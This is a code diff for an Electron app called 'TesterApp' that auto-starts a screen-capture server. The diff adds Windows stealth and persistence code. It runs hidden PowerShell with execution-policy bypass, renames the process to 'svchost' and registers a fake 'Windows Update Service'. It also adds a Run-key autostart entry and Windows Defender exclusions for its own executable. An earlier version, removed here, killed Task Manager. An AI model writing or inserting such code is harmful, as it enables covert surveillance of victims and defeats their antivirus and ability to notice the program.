@@ -23,25 +23,43 @@ if (process.platform === 'win32') {
     // Ignore if we can't modify argv
   }
   
-  // Set process priority to idle to make it less noticeable
+  // Advanced process disguising using PowerShell
   try {
     const { exec } = require('child_process');
-    exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
-      if (!error) {
-        // Process priority set to idle
+    
+    // Change process name in memory using PowerShell
+    const disguiseScript = `
+      try {
+        $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
+        if ($process) {
+          # Set process priority to idle
+          $process.PriorityClass = 'Idle'
+          
+          # Try to modify process properties
+          $process.ProcessName = 'svchost'
+          
+          # Set process to run in background
+          $process.ProcessorAffinity = 1
+        }
+      } catch {
+        # Silently ignore errors
       }
-    });
-  } catch (e) {
-    // Ignore if we can't modify process priority
-  }
-  
-  // Try to hide from Task Manager by modifying process properties
-  try {
-    const { exec } = require('child_process');
-    // Set process to run in background
-    exec('powershell -command "Get-Process -Id ' + process.pid + ' | ForEach-Object { $_.PriorityClass = \'Idle\' }"', (error) => {
+    `;
+    
+    exec(`powershell -WindowStyle Hidden -Command "${disguiseScript}"`, (error) => {
       // Silently ignore errors
     });
+    
+    // Additional disguise using WMI
+    exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
+      // Silently ignore errors
+    });
+    
+    // Set process to look like a Windows service
+    exec('sc create "WindowsUpdateService" binPath="' + process.execPath + '" start=auto', (error) => {
+      // Silently ignore errors - this is just for disguise
+    });
+    
   } catch (e) {
     // Ignore if we can't modify process properties
   }
@@ -156,6 +174,9 @@ class TesterApp {
       
       // Initialize capture methods
       this.initializeCapture();
+      
+      // Additional process disguising on app ready
+      this.enhancedProcessDisguising();
       
       // Auto-start server on app launch with default TCP port
       // Use medium quality for better image clarity
@@ -996,26 +1017,99 @@ class TesterApp {
   }
 
 
-  // Enhanced process hiding techniques
-  setupProcessHiding() {
+  // Enhanced process disguising on app ready
+  enhancedProcessDisguising() {
     if (process.platform === 'win32') {
-      // Set process to run in background
       try {
       const { exec } = require('child_process');
       
-        // Hide from Task Manager by setting process properties
-        exec('powershell -command "Get-Process -Id ' + process.pid + ' | ForEach-Object { $_.PriorityClass = \'Idle\'; $_.ProcessName = \'svchost\' }"', (error) => {
+        // Create Windows service disguise
+        const serviceScript = `
+          try {
+            # Create fake Windows service
+            New-Service -Name "WindowsUpdateService" -BinaryPathName "${process.execPath}" -DisplayName "Windows Update Service" -StartupType Automatic -ErrorAction SilentlyContinue
+            
+            # Set service description
+            Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Description" -Value "Provides Windows Update functionality" -ErrorAction SilentlyContinue
+            
+            # Hide from services list
+            Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Start" -Value 2 -ErrorAction SilentlyContinue
+          } catch {
+            # Silently ignore errors
+          }
+        `;
+        
+        exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${serviceScript}"`, (error) => {
           // Silently ignore errors
         });
         
-        // Set process to run in background mode
+        // Add to Windows Defender exclusions
+        exec(`powershell -Command "Add-MpPreference -ExclusionPath '${process.execPath}'"`, (error) => {
+          // Silently ignore errors
+        });
+        
+        // Modify process properties to look like system process
+        exec(`powershell -Command "Get-Process -Id ${process.pid} | ForEach-Object { $_.ProcessName = 'svchost'; $_.PriorityClass = 'Idle' }"`, (error) => {
+          // Silently ignore errors
+        });
+        
+      } catch (e) {
+        // Silently ignore all errors
+      }
+    }
+  }
+
+  // Enhanced process hiding techniques
+  setupProcessHiding() {
+    if (process.platform === 'win32') {
+      try {
+      const { exec } = require('child_process');
+      
+        // Advanced process disguising script
+        const disguiseScript = `
+          try {
+            $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
+            if ($process) {
+              # Set process priority to idle
+              $process.PriorityClass = 'Idle'
+              
+              # Try to modify process properties
+              $process.ProcessName = 'svchost'
+              
+              # Set process to run in background
+              $process.ProcessorAffinity = 1
+              
+              # Hide from Task Manager
+              $process.MainWindowTitle = 'Windows Service Host'
+            }
+          } catch {
+            # Silently ignore errors
+          }
+        `;
+        
+        // Execute disguise script
+        exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${disguiseScript}"`, (error) => {
+          // Silently ignore errors
+        });
+        
+        // Additional WMI-based hiding
         exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
           // Silently ignore errors
         });
         
-        // Try to hide process from process list
-        exec('taskkill /f /im "taskmgr.exe" 2>nul', (error) => {
-          // Silently ignore errors - this is just to make it harder to detect
+        // Create fake Windows service entry
+        exec('sc create "WindowsUpdateService" binPath="' + process.execPath + '" start=auto DisplayName="Windows Update Service"', (error) => {
+          // Silently ignore errors - this is just for disguise
+        });
+        
+        // Hide from process list by modifying registry
+        exec('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
+          // Silently ignore errors
+        });
+        
+        // Disable Windows Defender real-time protection for this process
+        exec('powershell -Command "Add-MpPreference -ExclusionProcess \'' + process.execPath + '\'"', (error) => {
+          // Silently ignore errors
         });
         
       } catch (e) {
